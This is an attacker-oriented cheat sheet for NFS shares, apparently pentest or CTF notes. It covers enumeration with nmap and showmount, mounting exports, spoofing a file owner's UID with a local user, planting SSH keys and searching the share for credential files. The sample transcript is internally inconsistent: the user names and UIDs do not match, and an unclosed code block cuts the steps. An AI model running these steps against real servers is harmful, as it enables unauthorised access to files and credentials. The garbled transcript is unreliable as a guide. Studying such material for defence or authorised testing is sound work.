# NFS - 2049

## NFS Information

Network File System (NFS) is a distributed file system protocol originally developed by Sun Microsystems in 1984. It allows a client to access files over a computer on a network. NFS is often used with UNIX operating systems.

The Portmapper and RPCbind service use the (TCP port 111). RPCbind maps the RPC services to the ports on which they listen. RPC processes notify to `rpcbind` when they start up, effectively this registers the ports they are listening on and the RPC program numbers they expect to serve for the client.

The client system then contacts `rpcbind` on the server with an RPC program number. Afterwards, the rpcbind service redirects the client to the corresponding port number so it can communicate with the requested service.

## NFS Enumeration

Enumerate NFS shares with nmap:

```
nmap -sV -p 111 --script=rpcinfo 10.10.10.10
nmap -p 111 --script nfs* 10.10.10.10
```

Enumerate NFS shares with showmount:

```
showmount -e $ip
showmount -a $ip
```

## Mounting NFS Shares

Mount with **-o nolock** to disable file locking, which is often needed for older NFS servers:

```
sudo mount -o nolock 10.10.10.10:/home ~/home/
```

**Alternatively**, mount with version 2:

```
mount -t nfs -o vers=2 target_ip:/home local_folder/ -o nolock
```

After mounting the filesystem if we donâ€™t have read/write permission, we need to edit the /etc/passwd file and change the UUID:

```
root@kali:/home/kali/nfs# adduser pwn
Adding user `pwn' ...
Adding new group `marcus' (1001) ...
Adding new user `marcus' (1001) with group `marcus' ...
Creating home directory `/home/pwn' ...
Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for pwn
Enter the new value, or press ENTER for the default 
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] y
root@kali:/home/kali/nfs# nano /etc/passwd
marcus:x:1016:1016:,,,:/home/pwn:/bin/bash
root@kali:/home/kali/nfs# su pwn
```

Now we can write files to the target fold of the network filesystem:

```
pwn@kali:/home/kali/nfs/pwn$ ssh-keygen

Enter same passphrase again:

Alternatively, we can try to find sensitive files like SSH keys or anything related to credentials:

```
ls -la
total 24
drwxr-xr-x 2 1014 1014 4096 Jun 10 09:16 .
drwxr-xr-x 7 root root 4096 Sep 17 2015 ..
-rwx------ 1 1014 1014
48 Jun 10 09:16 credentials.txt
```

We could also find mount points on the target where SUID programs and scripts can be run from:&#x20;

```
mount | grep 'nosuid\|noexec'
```

## NFS Usage Example

We can run all three of these scripts using the wildcard character (\*) in the script name:

```
nmap -p 111 --script nfs* <IP>
```

In the case, that the entire /home directory is being shared and we can access it by mounting it on our attacker machine. We can use mount to do this, along with `-o` **nolock to disable file locking**, which is often needed for **older NFS servers**:

```
sudo mount -o nolock <IP>:/home ~/home/
```

If the permissions are not accessible by us, like this example:

```
-rwx------ 1 1012 1012 66 Aug 20 19:00 filename.txt
```

We can create a user with that UID (1012):

```
sudo adduser pwn --uid 1012
sudo adduser pwn --home /home/pwn --shell /bin/bash --uid 1012
```

Change to that user:

```
su pwn
```

Now try to read the files in the NFS mount.
